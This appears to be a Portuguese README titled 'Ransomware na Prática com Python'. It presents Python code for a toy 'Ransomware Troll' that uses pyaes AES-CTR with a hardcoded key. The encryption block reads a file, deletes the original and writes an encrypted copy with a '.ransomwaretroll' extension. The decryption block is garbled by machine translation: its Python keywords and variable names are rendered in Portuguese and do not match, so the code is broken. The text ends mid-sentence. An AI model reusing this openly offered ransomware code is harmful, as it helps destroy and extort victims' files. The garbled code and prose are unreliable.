# Ransomware
Ransomware na Prática com Python

# Pré-requisitos
Antes de executar os códigos de descrição e criptografia, é necessário ter o Python instalado em seu sistema. Além disso, você deve ter uma biblioteca pyaesinstalada. Você pode conectá-lo usando o comandopip install pyaes .

# Código de Descripción
Aqui está o código base que pode ser usado para descrever arquivos criptografados pelo Ransomware Troll:

```pitão
importar sistema operacional
importar pyaes

#Nome do arquivo criptografado
file_name =  " arquivo.txt.ransomwaretroll "

# Abre o arquivo criptografado em modo de leitura binária
arquivo  =  aberto (nome_do_arquivo, " rb " )
file_data =  arquivo .read()
arquivo .close()

# Chave para descripção
chave =  b " testeransomwares "
aes = pyaes.AESModeOfOperationCTR(chave)

# Realizar a descritografia
decrypt_data = aes.decrypt(dados_do_arquivo)

# Removendo o arquivo criptografado
os.remove(nome_do_arquivo)

# Crie o arquivo descrito
new_file =  " arquivo.txt "
novo_arquivo =  aberto ( f ' { novo_arquivo } ' , " wb " )
novo_arquivo.escrever(descriptografar_dados)
novo_arquivo.fechar()
```


-Se de substituir "arquivo.txt.ransomwaretroll"pelo nome do arquivo criptografado real que você deseja descrever e"testeransomwares" pela chave correta de descritiva fornecida pelo atacante.

# Código de Criptografia
Aqui está o código base que pode ser usado para criptografar arquivos usando o Ransomware Troll:

import os

import pyaes

*Nome do arquivo a ser criptografado*

file_name = "arquivo.txt"

*Abrir o arquivo em modo de leitura binária*

file = open(file_name, "rb")

file_data = file.read()

file.close()

*Remover o arquivo original*

os.remove(file_name)

*Chave para criptografia*

key = b"testeransomwares"

aes = pyaes.AESModeOfOperationCTR(key)

*Realizar a criptografia*

crypto_data = aes.encrypt(file_data)

*Nome do novo arquivo criptografado*

new_file = file_name + ".ransomwaretroll"

new_file = open(f'{new_file}', 'wb')

new_file.write(crypto_data)

new_file.close()

-Se de substituir "arquivo.txt"pelo nome do arquivo que você deseja criptografar e"testeransomwares" pela chave correta de criptografia. O código criptografado será o arquivo selecionado e salvará uma versão criptografada com a extensão `.ransom
